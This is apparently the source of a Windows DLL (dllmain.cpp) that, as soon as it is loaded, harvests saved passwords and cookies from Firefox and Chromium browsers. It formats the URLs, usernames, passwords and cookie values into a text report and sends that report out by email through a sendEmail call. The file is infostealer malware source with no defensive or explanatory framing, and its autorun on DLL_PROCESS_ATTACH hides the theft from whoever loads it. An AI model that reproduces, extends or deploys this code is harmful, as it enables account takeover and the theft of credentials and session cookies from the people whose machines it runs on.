// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <fstream>
#include "includes/ChromeParser.h"
#include "includes/FireFoxParser.h"
#include "includes/FactoryCollector.h"
#include "includes/SendEmail.h"


void gather_result(const List<AccountData>& data, std::string& account_info)
{
	for (const auto& data : data)
	{

		account_info += "Url: " + data.Url  + "\nUsername: " + data.Username + "\nPassword: " + data.Password + "\n";
		account_info += "--------------------------------------------------------------------------------\n" ;
	}
}

void gather_result(const List<CookieData>& data, std::string& account_info)
{
	for (const auto& data : data)
	{
		account_info += "HostKey: " + data.HostKey + "\nname: " + data.Name + "\nValue:: "+ data.Value +"\nPath: " + data.Path + "\nExpireUTC: " + data.ExpireUTC + "\n";
		account_info += "--------------------------------------------------------------------------------\n";
	
	}

}

template<class T>
void clear(ICollector<T>* collector)
{
	if (!collector) return;
	delete collector;
	collector = nullptr;
}

void getInfo() {
	std::string account_info("Password information :\n");
	auto parser = collector::create_password_collector(collector::BrowserType::Mozilla);
	gather_result(parser->collect_data(), account_info);
	clear(parser);

	
	parser = collector::create_password_collector(collector::BrowserType::Chromium);
	gather_result(parser->collect_data(), account_info);
	clear(parser);

	account_info += "Cookies information :\n";
	auto parser_cookie = collector::create_cookies_collector(collector::BrowserType::Mozilla);
	gather_result(parser_cookie->collect_data(), account_info);
	clear(parser_cookie);

	parser_cookie = collector::create_cookies_collector(collector::BrowserType::Chromium);
	gather_result(parser_cookie->collect_data(), account_info);
	clear(parser_cookie);
	sendEmail("account infromation", account_info);

}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		getInfo();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

